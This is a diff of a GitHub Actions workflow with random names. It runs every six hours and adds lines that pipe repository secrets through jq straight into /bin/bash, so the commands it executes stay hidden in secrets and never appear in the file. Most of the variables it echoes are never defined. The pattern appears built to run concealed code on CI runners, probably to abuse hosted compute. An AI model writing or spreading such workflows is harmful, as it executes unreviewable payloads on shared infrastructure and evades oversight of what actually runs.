@@ -1,34 +1,24 @@
 name: sweatyforceful
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 3/6 * * *'
-
+    - cron: '4 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: sweatyforceful
         env:
-          pg1: ${{ secrets.pg1 }}
+          dzm8: ${{ secrets.dzm8 }}
         run: |
-          echo $pg1 | jq -r .zo4827 | /bin/bash
-          echo $pdtus6330 | jq -r .mppy94134 | /bin/bash
-          echo $bxpp0 | jq -r .ghzvd8 | /bin/bash
-          echo $kp1 | jq -r .n4 | /bin/bash
-          echo $bqobc09 | jq -r .v25908 | /bin/bash
-          echo $mg95 | jq -r .p8536 | /bin/bash
-          echo $nzbm95000 | jq -r .ee707 | /bin/bash
-          echo $nhwbl887 | jq -r .cxx4902 | /bin/bash
-          echo $rcwhe67518 | jq -r .djq1772 | /bin/bash
-          echo $nruxw2764 | jq -r .a9 | /bin/bash
-          echo $u73175 | jq -r .d1 | /bin/bash
-          echo $agti765 | jq -r .in64 | /bin/bash
-          echo $us78 | jq -r .i223 | /bin/bash
-          echo $rs6461 | jq -r .bw02 | /bin/bash
-          echo $fl0 | jq -r .qyhqj0436 | /bin/bash
-          echo $ojfqv0370 | jq -r .mhtbz580 | /bin/bash
-          echo $cvwg8781 | jq -r .mxwge530 | /bin/bash
+          echo $dzm8 | jq -r .riuhb35888 | /bin/bash
+          echo $s70 | jq -r .sbfw6 | /bin/bash
+          echo $rwoc9 | jq -r .gkknr70 | /bin/bash
+          echo $rmkh5665 | jq -r .jlx47 | /bin/bash
+          echo $jx0356 | jq -r .hxic78 | /bin/bash
+          echo $gxgo02 | jq -r .j71 | /bin/bash
+          echo $yudx5 | jq -r .qifz12811 | /bin/bash
+          echo $iycev91139 | jq -r .njnzf135 | /bin/bash
 
